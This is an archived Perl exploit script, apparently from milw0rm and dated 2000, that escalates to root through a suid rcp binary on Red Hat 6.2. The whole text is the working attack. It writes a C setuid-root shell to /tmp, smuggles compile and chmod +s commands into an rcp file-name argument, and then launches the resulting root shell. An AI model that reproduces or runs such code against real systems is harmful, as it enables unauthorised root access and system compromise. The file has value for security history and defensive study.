<html><head><title>rpc Suid Privledge Exploit</title></head><pre>#!/usr/bin/perl -w
#
# exploits suid privledges on rcp
# Not really tested this but hey
# works on redhat6.2
# not werk on freebsd4.1 stable
#
# bug discovered by
# Andrew Griffiths
#
# Exploit written by tlabs
# greetz to those that know me innit
#
# Please set your rcpfile
# this can be found by doing
#
# ls -alF `which rcp`
#
# have a lot of fun

$RCPFILE=&quot;/usr/bin/rcp&quot; ;

# configure above innit

sub USAGE
{
    print &quot;$0\nWritten by Tlabs\n&quot; ;
    exit 0 ;
}

if ( ! -u &quot;$RCPFILE&quot; )
{
    printf &quot;rcp is not suid, quiting\n&quot; ;
    exit 0;
}

open(TEMP, &quot;&gt;&gt;/tmp/shell.c&quot;)|| die &quot;Something went wrong: $!&quot; ;
printf TEMP &quot;#include&lt;unistd.h&gt;\n#include&lt;stdlib.h&gt;\nint main()\n{&quot; ;
printf TEMP &quot;    setuid(0);\n\tsetgid(0);\n\texecl(\&quot;/bin/sh\&quot;,\&quot;sh\&quot;,0);\n\treturn 0;\n}\n&quot; ;
close(TEMP);
open(HMM, &quot;&gt;hey&quot;)|| die &quot;Something went wrong: $!&quot;;
print HMM &quot;Sploit written by tlabs, thanks to Andrew Griffiths for the bug report&quot; ;
close(HMM);

system &quot;rcp 'hey geezer; gcc -o /tmp/shell /tmp/shell.c;' localhost 2&gt; /dev/null&quot; ;
system &quot;rcp 'hey geezer; chmod +s /tmp/shell;' localhost 2&gt; /dev/null&quot; ;
unlink(&quot;/tmp/shell.c&quot;);
unlink(&quot;hey&quot;);
unlink(&quot;geezer&quot;);
printf &quot;Ok, too easy, we'll just launch a shell, lets hope shit went well, innit:)\n&quot; ;

exec '/tmp/shell' ;


# milw0rm.com [2000-11-29]</pre></html>